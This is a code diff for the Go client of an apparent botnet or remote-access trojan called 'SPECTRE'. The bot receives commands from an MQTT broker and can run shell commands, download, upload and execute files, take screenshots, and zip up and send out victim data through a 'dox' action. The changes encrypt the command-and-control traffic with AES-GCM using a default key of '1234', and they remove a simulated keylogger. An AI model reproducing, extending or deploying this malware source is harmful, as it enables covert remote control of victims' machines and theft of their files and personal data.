@@ -4,11 +4,15 @@ package main
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	crand "crypto/rand" // Alias crypto/rand to avoid conflict
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"image/png"
+	"io"
 	"io/ioutil"
 	"math/rand"
 	"net"
@@ -26,11 +30,12 @@ import (
 )
 
 var (
-	brokerURL  = "{BROKER_URL}" // To be replaced by SPECTRE.py
-	brokerPort = {BROKER_PORT}  // To be replaced by SPECTRE.py
-	topic      = "{TOPIC}"      // To be replaced by SPECTRE.py
-	botID      = "{BOT_ID}"     // To be replaced by SPECTRE.py
-	apiToken   = "{API_TOKEN}"  // To be replaced by SPECTRE.py
+	brokerURL     = "{BROKER_URL}"     // To be replaced by SPECTRE.py
+	brokerPort    = {BROKER_PORT}      // To be replaced by SPECTRE.py
+	topic         = "{TOPIC}"          // To be replaced by SPECTRE.py
+	botID         = "{BOT_ID}"         // To be replaced by SPECTRE.py
+	apiToken      = "{API_TOKEN}"      // To be replaced by SPECTRE.py
+	encryptionKey = "{ENCRYPTION_KEY}" // To be replaced by SPECTRE.py, default "1234"
 
 	client        mqtt.Client
 	running       bool = true
@@ -46,8 +51,101 @@ var (
 	chatPort      int         // Port of the active chat session
 	chatMessages  []string    // Queue of messages for the chat session
 	chatMutex     sync.Mutex  // Mutex to protect chatMessages
-	keylogging    bool        // Track keylogging state
 )
+
+func encryptMessage(message string) string {
+	key := []byte(encryptionKey)
+	// Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
+	if len(key) < 16 {
+		key = append(key, make([]byte, 16-len(key))...) // Pad with null bytes
+	} else if len(key) > 16 && len(key) < 24 {
+		key = append(key, make([]byte, 24-len(key))...)
+	} else if len(key) > 24 && len(key) < 32 {
+		key = append(key, make([]byte, 32-len(key))...)
+	} else if len(key) > 32 {
+		key = key[:32] // Truncate to AES-256 length
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		fmt.Fprintf(logFile, "Bot %s encryption error: %v\n", botID, err)
+		return message
+	}
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fmt.Fprintf(logFile, "Bot %s encryption error: %v\n", botID, err)
+		return message
+	}
+
+	nonce := make([]byte, aesgcm.NonceSize()) // 12 bytes by default for GCM
+	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
+		fmt.Fprintf(logFile, "Bot %s encryption error: %v\n", botID, err)
+		return message
+	}
+
+	// Encrypt and get ciphertext + tag
+	ciphertext := aesgcm.Seal(nil, nonce, []byte(message), nil)
+	// Extract the tag (last 16 bytes of ciphertext)
+	tag := ciphertext[len(ciphertext)-16:]
+	// Extract the actual ciphertext (without tag)
+	pureCiphertext := ciphertext[:len(ciphertext)-16]
+	// Combine nonce + pure ciphertext + tag
+	encrypted := append(nonce, pureCiphertext...)
+	encrypted = append(encrypted, tag...)
+	return base64.StdEncoding.EncodeToString(encrypted)
+}
+
+func decryptMessage(encryptedMessage string) string {
+	encryptedData, err := base64.StdEncoding.DecodeString(encryptedMessage)
+	if err != nil {
+		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		return encryptedMessage
+	}
+
+	key := []byte(encryptionKey)
+	// Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
+	if len(key) < 16 {
+		key = append(key, make([]byte, 16-len(key))...) // Pad with null bytes
+	} else if len(key) > 16 && len(key) < 24 {
+		key = append(key, make([]byte, 24-len(key))...)
+	} else if len(key) > 24 && len(key) < 32 {
+		key = append(key, make([]byte, 32-len(key))...)
+	} else if len(key) > 32 {
+		key = key[:32] // Truncate to AES-256 length
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		return encryptedMessage
+	}
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		return encryptedMessage
+	}
+
+	nonceSize := aesgcm.NonceSize() // 12 bytes
+	if len(encryptedData) < nonceSize+16 { // At least nonce + tag (16 bytes)
+		fmt.Fprintf(logFile, "Bot %s decryption error: invalid encrypted data\n", botID)
+		return encryptedMessage
+	}
+
+	nonce := encryptedData[:nonceSize]
+	tag := encryptedData[len(encryptedData)-16:]
+	ciphertext := encryptedData[nonceSize : len(encryptedData)-16]
+	// Combine ciphertext and tag for Go's Open method
+	combinedCiphertext := append(ciphertext, tag...)
+	plaintext, err := aesgcm.Open(nil, nonce, combinedCiphertext, nil)
+	if err != nil {
+		fmt.Fprintf(logFile, "Bot %s decryption error: %v\n", botID, err)
+		return encryptedMessage
+	}
+
+	return string(plaintext)
+}
 
 // HTML template for the chat interface with polling
 const chatHTML = `
@@ -192,14 +290,14 @@ type CommandMessage struct {
 }
 
 type ResponseMessage struct {
-	Type      string `json:"type"`
-	ID        string `json:"id"`
-	IP        string `json:"ip"`
-	Message   string `json:"message,omitempty"`
-	Result    string `json:"result,omitempty"`
+	Type       string `json:"type"`
+	ID         string `json:"id"`
+	IP         string `json:"ip"`
+	Message    string `json:"message,omitempty"`
+	Result     string `json:"result,omitempty"`
 	CurrentDir string `json:"current_dir,omitempty"`
-	ZipData   string `json:"zip_data,omitempty"`
-	FileData  string `json:"file_data,omitempty"` // For download/screenshot
+	ZipData    string `json:"zip_data,omitempty"`
+	FileData   string `json:"file_data,omitempty"` // For download/screenshot
 }
 
 func sendPresence(client mqtt.Client) {
@@ -218,7 +316,8 @@ func sendPresence(client mqtt.Client) {
 		Hostname: hostname,
 	}
 	msgBytes, _ := json.Marshal(connectMsg)
-	client.Publish(topic, 1, false, msgBytes)
+	encryptedMsg := encryptMessage(string(msgBytes))
+	client.Publish(topic, 1, false, encryptedMsg)
 	fmt.Fprintf(logFile, "Bot %s sent presence: %s\n", botID, string(msgBytes))
 }
 
@@ -381,24 +480,6 @@ func takeScreenshot() (string, error) {
 	return encodedData, nil
 }
 
-func simulateKeylogging(client mqtt.Client, ip string) {
-	keys := []string{"a", "b", "c", "1", "2", "Enter", "Space", "Ctrl", "Shift"}
-	for keylogging && running && isConnected {
-		// Simulate a keystroke
-		key := keys[rand.Intn(len(keys))]
-		response := ResponseMessage{
-			Type:    "keylog_response",
-			ID:      botID,
-			IP:      ip,
-			Message: key,
-		}
-		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
-		fmt.Fprintf(logFile, "Bot %s sent keylog response: %s\n", botID, key)
-		time.Sleep(2 * time.Second) // Simulate keystrokes every 2 seconds
-	}
-}
-
 func handleMessageInteraction(message string) {
 	chatMutex.Lock()
 	if chatActive {
@@ -496,11 +577,19 @@ func handleMessageInteraction(message string) {
 
 func onMessage(client mqtt.Client, msg mqtt.Message) {
 	var data CommandMessage
-	if err := json.Unmarshal(msg.Payload(), &data); err != nil {
+	encryptedMessage := string(msg.Payload())
+	if encryptedMessage == "" {
+		fmt.Fprintf(logFile, "Bot %s received empty message, ignoring\n", botID)
+		return
+	}
+
+	// Decrypt the message
+	message := decryptMessage(encryptedMessage)
+	if err := json.Unmarshal([]byte(message), &data); err != nil {
 		fmt.Fprintf(logFile, "Bot %s error decoding message: %v\n", botID, err)
 		return
 	}
-	fmt.Fprintf(logFile, "Bot %s received message: %s\n", botID, string(msg.Payload()))
+	fmt.Fprintf(logFile, "Bot %s received message: %s\n", botID, message)
 
 	if data.Type == "command" {
 		target := data.Target
@@ -560,14 +649,15 @@ func processAction(action string, data CommandMessage) {
 		command := data.Command
 		result := executeShellCommand(command)
 		response := ResponseMessage{
-			Type:      "shell_response",
-			ID:        botID,
-			IP:        ip,
-			Result:    result,
+			Type:       "shell_response",
+			ID:         botID,
+			IP:         ip,
+			Result:     result,
 			CurrentDir: currentDir,
 		}
 		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
+		encryptedMsg := encryptMessage(string(msgBytes))
+		client.Publish(topic, 1, false, encryptedMsg)
 		fmt.Fprintf(logFile, "Bot %s sent shell response: %s\n", botID, string(msgBytes))
 	case "download":
 		fileName := data.File
@@ -595,7 +685,8 @@ func processAction(action string, data CommandMessage) {
 			Message:  fileName,
 		}
 		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
+		encryptedMsg := encryptMessage(string(msgBytes))
+		client.Publish(topic, 1, false, encryptedMsg)
 		fmt.Fprintf(logFile, "Bot %s sent download response for file %s\n", botID, fileName)
 	case "upload":
 		fileName := data.File
@@ -617,7 +708,8 @@ func processAction(action string, data CommandMessage) {
 			Message: fmt.Sprintf("File %s uploaded successfully", fileName),
 		}
 		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
+		encryptedMsg := encryptMessage(string(msgBytes))
+		client.Publish(topic, 1, false, encryptedMsg)
 		fmt.Fprintf(logFile, "Bot %s sent upload response for file %s\n", botID, fileName)
 	case "execute":
 		fileName := data.File
@@ -650,7 +742,8 @@ func processAction(action string, data CommandMessage) {
 			Message: fmt.Sprintf("File %s executed", fileName),
 		}
 		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
+		encryptedMsg := encryptMessage(string(msgBytes))
+		client.Publish(topic, 1, false, encryptedMsg)
 		fmt.Fprintf(logFile, "Bot %s sent execute response for file %s\n", botID, fileName)
 	case "screenshot":
 		encodedData, err := takeScreenshot()
@@ -666,19 +759,9 @@ func processAction(action string, data CommandMessage) {
 			Message:  fmt.Sprintf("screenshot_%s.png", time.Now().Format("20060102_150405")),
 		}
 		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
+		encryptedMsg := encryptMessage(string(msgBytes))
+		client.Publish(topic, 1, false, encryptedMsg)
 		fmt.Fprintf(logFile, "Bot %s sent screenshot response\n", botID)
-	case "keylog":
-		if keylogging {
-			fmt.Fprintf(logFile, "Bot %s keylogging already running\n", botID)
-			return
-		}
-		keylogging = true
-		fmt.Fprintf(logFile, "Bot %s starting keylogging\n", botID)
-		go simulateKeylogging(client, ip)
-	case "stop_keylog":
-		keylogging = false
-		fmt.Fprintf(logFile, "Bot %s stopped keylogging\n", botID)
 	case "dox":
 		fmt.Fprintf(logFile, "Bot %s processing dox command\n", botID)
 		zipData := createDoxZip()
@@ -689,7 +772,8 @@ func processAction(action string, data CommandMessage) {
 			ZipData: zipData,
 		}
 		msgBytes, _ := json.Marshal(response)
-		client.Publish(topic, 1, false, msgBytes)
+		encryptedMsg := encryptMessage(string(msgBytes))
+		client.Publish(topic, 1, false, encryptedMsg)
 		fmt.Fprintf(logFile, "Bot %s sent dox response\n", botID)
 	case "message":
 		message := data.Message
@@ -752,7 +836,8 @@ func main() {
 						Message: reply,
 					}
 					msgBytes, _ := json.Marshal(response)
-					client.Publish(topic, 1, false, msgBytes)
+					encryptedMsg := encryptMessage(string(msgBytes))
+					client.Publish(topic, 1, false, encryptedMsg)
 					fmt.Fprintf(logFile, "Bot %s sent message reply: %s\n", botID, string(msgBytes))
 				}
 			default:
